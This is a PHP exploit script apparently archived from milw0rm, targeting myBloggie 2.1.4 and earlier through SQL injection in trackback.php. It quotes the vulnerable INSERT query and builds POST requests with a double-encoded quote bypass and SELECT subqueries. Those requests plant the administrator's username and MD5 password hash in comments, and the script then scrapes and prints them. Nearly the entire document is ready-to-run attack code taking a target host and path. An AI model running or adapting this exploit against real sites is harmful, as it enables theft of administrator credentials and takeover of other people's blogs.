<html><head><title>myBloggie <= 2.1.4 (trackback.php) Multiple SQL Injections Exploit</title></head><pre>#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo &quot;MyBloggie &lt;= 2.1.4 trackback.php multiple SQL injections vulnerability /\n&quot;;
echo &quot;administrative credentials disclosure exploit\n&quot;;
echo &quot;by rgod rgod@autistici.org\n&quot;;
echo &quot;site: http://retrogod.altervista.org\n\n&quot;;

/*
works regardless of php.ini settings
against MySQL &gt;= 4.1 (allowing subs)
*/

if ($argc&lt;3) {
echo &quot;Usage: php &quot;.$argv[0].&quot; host path OPTIONS\n&quot;;
echo &quot;host:      target server (ip/hostname)\n&quot;;
echo &quot;path:      path to MyBloggie\n&quot;;
echo &quot;Options:\n&quot;;
echo &quot;   -i           specify an existent post id (default: 1)\n&quot;;
echo &quot;   -T[prefix]   specify a table prefix different from default (mb_)\n&quot;;
echo &quot;   -p[port]:    specify a port other than 80\n&quot;;
echo &quot;   -P[ip:port]: specify a proxy\n&quot;;
echo &quot;   -d:          disclose table prefix (reccomended)\n&quot;;
echo &quot;Example:\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /MyBloggie/ -d -i7\r\n&quot;;
echo &quot;php &quot;.$argv[0].&quot; localhost /MyBloggie/ -Tm_\r\n&quot;;
die;
}

/* software site: http://mybloggie.mywebland.com/

  vulnerable code in trackback.php:

...
if(!empty($_REQUEST['title'])) {
$title=urldecode(substr($_REQUEST['title'],0,$tb_title_len));
}
else { $tback-&gt;trackback_reply(1, &quot;&lt;p&gt;Sorry, Trackback failed.. Reason : No title&lt;/p&gt;&quot;); }

if(!empty($_REQUEST['url'])) {
$url=urldecode($_REQUEST['url']);

if (validate_url($url)==false) { $tback-&gt;trackback_reply(1, &quot;&lt;p&gt;Sorry, Trackback failed.. Reason : URL not valid&lt;/p&gt;&quot;); }
}
else { $tback-&gt;trackback_reply(1, &quot;&lt;p&gt;Sorry, Trackback failed.. Reason : No URL&lt;/p&gt;&quot;); }

if(!empty($_REQUEST['excerpt']))
 {
  $excerpt=urldecode(substr($_REQUEST['excerpt'],0,$tb_excerpt_len));
 } else {
    $tback-&gt;trackback_reply(1, &quot;&lt;p&gt;Sorry, Trackback failed.. Reason : No Excerpt&lt;/p&gt;&quot;);
 }

// The blog name
if(!empty($_REQUEST['blog_name']))
 {
    $blog_name=urldecode(substr($_REQUEST['blog_name'],0,$tb_blogname_len));
 } else
 {
    $blog_name=&quot;No Blog Name&quot;;
 }

$timestamp = mktime(gmtdate('H', time(), $timezone ),gmtdate('i', time(), $timezone ),
             gmtdate('s', time(), $timezone ), gmtdate('n', time(), $timezone ),
             gmtdate('d', time(), $timezone ), gmtdate('Y', time(), $timezone ));

$sql = &quot;INSERT INTO &quot;.COMMENT_TBL.&quot; SET post_id='$tb_id', comment_subject='$title', comments='$excerpt', com_tstamp='$timestamp' ,
              poster = '$blog_name', home='$url', comment_type='trackback'&quot;;

$result = $db-&gt;sql_query($sql) or die(&quot;Cannot query the database.&lt;br&gt;&quot; . mysql_error());
...

you have sql injection in 'title', 'url', 'excerpt' and 'blog_name' argument
with MySQL &gt;= 4.1 that allows SELECT subqueries for INSERT...

so you can insert admin username &amp; password hash inside comments and you will see them at screen
also arguments are passed to urldecode(), so you can bypass magic_quotes_gpc
with '%2527' sequence for the single quote char
adn you can disclose table prefix going to:

http://192.168.1.3/mybloggie/index.php?mode=viewdate

you will have an error that disloses a query fragment

-

ex., injecting code in 'title' argument, query becomes:

INSERT INTO mb_comment SET post_id='1', comment_subject='hi',comments=(SELECT CONCAT('&lt;!--',password,'--&gt;')FROM mb_user)/*', comments='whatever', com_tstamp='1154799697' ,
poster = 'whatever', home='http://www.suntzu.org', comment_type='trackback'
									      */

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
   $c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
   }
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo &quot;\r\n&quot;.$html;
}

function is_hash($hash)
{
 if (ereg(&quot;^[a-f0-9]{32}&quot;,trim($hash))) {return true;}
 else {return false;}
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$prefix=&quot;mb_&quot;;
$post_id=&quot;1&quot;;//admin
$proxy=&quot;&quot;;
$dt=0;

for ($i=3; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-T&quot;)
{
  $prefix=str_replace(&quot;-T&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-i&quot;)
{
  $post_id=(int) str_replace(&quot;-i&quot;,&quot;&quot;,$argv[$i]);
  echo &quot;post id -&gt; &quot;.$post_id.&quot;\n&quot;;
}
if ($temp==&quot;-d&quot;)
{
  $dt=1;
}
}
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

if ($dt)
{
$packet =&quot;GET &quot;.$p.&quot;index.php?mode=viewdate HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
if (strstr($html,&quot;You have an error in your SQL syntax&quot;))
{
  $temp=explode(&quot;UNIXTIME(&quot;,$html);
  $temp2=explode(&quot;posts.timest&quot;,$temp[1]);
  $prefix=$temp2[0];
  echo &quot;table prefix -&gt; &quot;.$prefix.&quot;\n&quot;;
}
}

$sql=&quot;%2527,comments=(SELECT CONCAT(%2527&lt;!--%2527,password,%2527--&gt;%2527)FROM &quot;.$prefix.&quot;user)/*&quot;;
//some problems with argument length, maybe with prefix &gt; 3 chars you will have some error, cut the '&lt;!--' but hash will be clearly visible in comments
$data=&quot;title=hi&quot;.$sql;
$data.=&quot;&amp;url=http%3a%2f%2fwww%2esuntzu%2eorg&quot;;
$data.=&quot;&amp;excerpt=whatever&quot;;
$data.=&quot;&amp;blog_name=whatever&quot;;
$packet =&quot;POST &quot;.$p.&quot;trackback.php/$post_id HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);

$sql=&quot;%2527,comments=(SELECT CONCAT(%2527&lt;!--%2527,user,%2527--&gt;%2527)FROM &quot;.$prefix.&quot;user)/*&quot;;
$data=&quot;title=hi&quot;.$sql;
$data.=&quot;&amp;url=http%3a%2f%2fwww%2esuntzu%2eorg&quot;;
$data.=&quot;&amp;excerpt=whatever&quot;;
$data.=&quot;&amp;blog_name=whatever&quot;;
$packet =&quot;POST &quot;.$p.&quot;trackback.php/$post_id HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacketii($packet);
sleep(1);

$packet =&quot;GET &quot;.$p.&quot;index.php?mode=viewid&amp;post_id=$post_id HTTP/1.0\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
sendpacketii($packet);
//echo $html;
$temp=explode('&quot;message&quot;&gt;&lt;!--',$html);
for ($i=1; $i&lt;count($temp); $i++)
{
$temp2=explode(&quot;--&gt;&quot;,$temp[$i]);
if (is_hash($temp2[0]))
{
  $hash=$temp2[0];
  $temp2=explode(&quot;--&gt;&quot;,$temp[$i+1]);
  $admin=$temp2[0];
  echo &quot;----------------------------------------------------------------\n&quot;;
  echo &quot;admin          -&gt; &quot;.$admin.&quot;\n&quot;;
  echo &quot;password (md5) -&gt; &quot;.$hash.&quot;\n&quot;;
  echo &quot;----------------------------------------------------------------\n&quot;;
  die();
}
}
//if you are here...
echo &quot;exploit failed...&quot;;
?&gt;

# milw0rm.com [2006-08-07]</pre></html>